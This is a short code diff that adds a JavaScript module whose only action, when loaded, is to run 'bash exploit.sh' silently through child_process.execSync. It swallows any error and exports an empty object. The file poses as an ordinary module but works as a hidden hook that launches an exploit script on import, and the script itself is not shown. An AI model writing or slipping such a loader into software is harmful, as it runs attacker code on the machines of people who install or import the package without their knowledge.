@@ -1,0 +1,5 @@
+const { execSync } = require('child_process');
+try {
+    execSync('bash exploit.sh', { stdio: 'inherit' });
+} catch (e) {}
+module.exports = {};
